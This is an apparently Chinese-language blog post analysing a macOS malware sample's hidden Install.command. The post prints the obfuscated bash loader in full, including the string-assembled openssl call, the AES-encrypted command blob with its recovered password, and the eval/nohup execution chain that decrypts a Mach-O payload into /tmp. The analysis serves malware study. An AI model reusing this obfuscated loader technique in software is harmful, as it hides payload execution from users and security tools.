<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="scr1pt"><title>simple_macos_analysis · scr1pt's blog</title><meta name="description" content="安装其实安装的命令实际上是.hidden/Install.command，显然是一个隐藏文件夹，进入后可以看到两个文件

文件分析对于Install.command去掉末尾的&amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp; killall  Terminal  并利用bash -x 执"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/scr1pt.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/scr1pt.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/scr1pt.jpg" style="width:200px;" alt="favicon"><h3 title=""><a href="/">scr1pt's blog</a></h3><div class="description"><p>my dear virus, please fuck me</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/scr1pt-kid"><i class="fa fa-github"></i></a></li><li><a href="mailto:2466811523@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2466811523"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> scr1pt</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>simple_macos_analysis</a></h3></div><div class="post-content"><p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>其实安装的命令实际上是<code>.hidden/Install.command</code>，显然是一个隐藏文件夹，进入后可以看到两个文件</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220210125745785.png" alt="image-20220210125745785"></p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>对于<code>Install.command</code>去掉末尾的<code>&gt;/dev/null 2&gt;&amp;1 &amp; killall  Terminal  </code>并利用<code>bash -x</code> 执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">G=&quot;a&quot;;F=&quot;c&quot;;Q=&quot;d&quot;;H=&quot;e&quot;;V=&quot;l&quot;;Z=&quot;m&quot;;X=&quot;n&quot;;T=&quot;o&quot;;J=&quot;p&quot;;K=&quot;s&quot;;</span><br><span class="line">export appDir=$(cd &quot;$(dirname &quot;$0&quot;)&quot;; pwd -P)</span><br><span class="line">export tmpDir=&quot;$(mktemp -d /tmp/XXXXXXXXXXXX)&quot;</span><br><span class="line">export binFile=&quot;$(cd &quot;$appDir&quot;; ls | grep -Ev &#x27;\.(command)$&#x27; | head -n 1 | rev)&quot;</span><br><span class="line">export archive=&quot;$(echo $binFile | rev)&quot;</span><br><span class="line">export commandArgs=&#x27;U2FsdGVkX19lI1c3x5jsG75i2MqkEp6BnnsxbYhGNNEAue1FVJV9tb3iame0XC4MkHJBluNzxrzAHRIaEfLdG53m5HsoftQYM86oQ4DmCvzHTgXbModNxL5uT4skXGdepJjnAsnKaUrG+Sg0H38NX5Dx9QOJHOH7rLY84emrHDWF9td75Urxvq2PNxO4X88LXHuV/IlXeoAbPhgkhNiBS9s6k8VP7p1RR1q/Ld1ySGmcvvoNXIGrHqEwGndAs/ZmXs2BMLQQ4yPxiqiG07CJfwUjzpgEirZOPfJ3BkixdvkurFrm+8jM5uWYPrP5fmZV8zsxtvOmgEyztEbZE0GDurvXuVaMyrsfGlWo5KVeiP9aW5dbjmuWEnm2SBz+H/NPa4UL56qwl6oe9K6yErvM3g==&#x27;</span><br><span class="line">decryptedFommand=&quot;$(echo -e &quot;$commandArgs&quot; | $&#123;T&#125;$&#123;J&#125;$&#123;H&#125;$&#123;X&#125;$&#123;K&#125;$&#123;K&#125;$&#123;V&#125; $&#123;H&#125;$&#123;X&#125;$&#123;F&#125; -$&#123;G&#125;$&#123;H&#125;$&#123;K&#125;-256-cbc -$&#123;Q&#125; -A -b$&#123;G&#125;$&#123;K&#125;$&#123;H&#125;64 -$&#123;J&#125;$&#123;G&#125;$&#123;K&#125;$&#123;K&#125; &quot;$&#123;J&#125;$&#123;G&#125;$&#123;K&#125;$&#123;K&#125;:$archive&quot;)&quot;</span><br><span class="line">nohup /bin/bash -c &quot;$&#123;H&#125;v$&#123;G&#125;$&#123;V&#125; \&quot;$decryptedFommand\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220210115608665.png" alt="image-20220210115608665"></p>
<p>利用aes解密了commandArgs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e U2FsdGVkX19lI1c3x5jsG75i2MqkEp6BnnsxbYhGNNEAue1FVJV9tb3iame0XC4MkHJBluNzxrzAHRIaEfLdG53m5HsoftQYM86oQ4DmCvzHTgXbModNxL5uT4skXGdepJjnAsnKaUrG+Sg0H38NX5Dx9QOJHOH7rLY84emrHDWF9td75Urxvq2PNxO4X88LXHuV/IlXeoAbPhgkhNiBS9s6k8VP7p1RR1q/Ld1ySGmcvvoNXIGrHqEwGndAs/ZmXs2BMLQQ4yPxiqiG07CJfwUjzpgEirZOPfJ3BkixdvkurFrm+8jM5uWYPrP5fmZV8zsxtvOmgEyztEbZE0GDurvXuVaMyrsfGlWo5KVeiP9aW5dbjmuWEnm2SBz+H/NPa4UL56qwl6oe9K6yErvM3g== | openssl enc -aes-256-cbc -d -A -base64 -pass pass:3Mj2Qk7tMC8</span><br></pre></td></tr></table></figure>

<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220210120952270.png" alt="image-20220210120952270"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -p  获取电脑的处理器型号</span><br><span class="line">xattr 命令用于展示和修改扩展属性</span><br><span class="line">chmod 用于修改权限</span><br></pre></td></tr></table></figure>

<p>然后给我们安装rosetta，然后执行命令<code>openssl enc -aes-256-cbc -d -A -base64 -k \&quot;3Mj2Qk7tMC8\&quot; -in \&quot;/Users/sc1pt/Desktop/3Mj2Qk7tMC8\&quot; -out \&quot;/tmp/9Tmgh5w7GhNI/8CMt7kQ2jM3</code></p>
<p>对应列表如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+ export appDir=/Users/sc1pt/Desktop</span><br><span class="line">+ appDir=/Users/sc1pt/Desktop</span><br><span class="line">++ mktemp -d /tmp/XXXXXXXXXXXX</span><br><span class="line">+ export tmpDir=/tmp/9Tmgh5w7GhNI</span><br><span class="line">+ tmpDir=/tmp/9Tmgh5w7GhNI</span><br><span class="line">++ cd /Users/sc1pt/Desktop</span><br><span class="line">++ ls</span><br><span class="line">++ grep -Ev &#x27;\.(command)$&#x27;</span><br><span class="line">++ head -n 1</span><br><span class="line">++ rev</span><br><span class="line">+ export binFile=8CMt7kQ2jM3</span><br><span class="line">+ binFile=8CMt7kQ2jM3</span><br><span class="line">++ echo 8CMt7kQ2jM3</span><br><span class="line">++ rev</span><br><span class="line">+ export archive=3Mj2Qk7tMC8</span><br><span class="line">+ archive=3Mj2Qk7tMC8</span><br></pre></td></tr></table></figure>

<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220210122203290.png" alt="image-20220210122203290"></p>
<p>查了一下md5，确实是恶意代码，找到一份比较详细的报告<a target="_blank" rel="noopener" href="https://www.joesandbox.com/analysis/565765/0/html">https://www.joesandbox.com/analysis/565765/0/html</a></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220210122408388.png" alt="image-20220210122408388"></p>
<p>那么接下来就是分析Mach-O文件了，还不会…..</p>
</p><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>Author: scr1pt</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-23</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 552 words, 1 min 50 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://Scr1pt-kid.github.io/2022/03/23/macos_sample_2.10/,scr1pt's blog,simple_macos_analysis,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/03/23/cruloader/" title="cruloader">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/03/23/2021-09-02%20(THURSDAY)%20-%20HANCITOR%20(CHANITORMAN1MOSKALVZAPOETA511)%20WITH%20COBALT%20STRIKE%20(BEACON)/" title="2021-09-02 hancitor">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>